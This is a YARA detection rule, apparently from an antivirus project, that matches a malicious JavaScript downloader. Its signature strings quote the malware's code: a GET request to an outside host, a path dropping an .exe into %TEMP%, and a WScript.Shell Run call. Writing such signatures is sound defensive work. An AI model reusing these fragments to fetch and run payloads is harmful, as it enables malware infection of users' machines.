rule sig_20160329_cd7733d23035aba442f907b946051887 {
  meta:
    description = "datamaliciousorder - file 20160329_cd7733d23035aba442f907b946051887.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "2251dfc9a39e5575daa9b9a1e5115842b8a5303b779023ac3f96fb1377aeb1ac"

  strings:
    $s1  = "j[y](\"GET\", \"http://fittedcarmats.com/m4usa\", false);" fullword ascii
    $s2  = "function wK() {return uY[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ANp7e5aW.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[N](R() * 11); if (j[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "function Wh(Ne, UR){Y = Y * 1; return Ne - UR;};" fullword ascii
    $s5  = "var uY = function x() {return WScript[J](\"WScript.Shell\");}(), vr = 11;" fullword ascii
    $s6  = "function ud(){return \"\" + ne;};" fullword ascii
    $s7  = "function x0(ji){uY[\"Run\"](ji, Y, Y);};" fullword ascii
    $s8  = "function u() {return ((y0 == true) && (y0 == NS)) ? 1 : Y;};" fullword ascii
    $s9  = "var U = new this[\"Date\"]();" fullword ascii
    $s10 = "function R(){return 22;};" fullword ascii
    $s11 = "return Wh(t, ci);" fullword ascii
    $s12 = "function rz(){return J;};" fullword ascii
    $s13 = "function IZ()" fullword ascii
    $s14 = "function K(at) {var I = (1, 2, 3, 4, 5, at); return I;};" fullword ascii
    $s15 = " while (RD){" fullword ascii
    $s16 = "var t0 = false;" fullword ascii
    $s17 = "NS = true; " fullword ascii
    $s18 = "var y0 = false;" fullword ascii
    $s19 = "y0 = true; " fullword ascii
    $s20 = "var NS = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}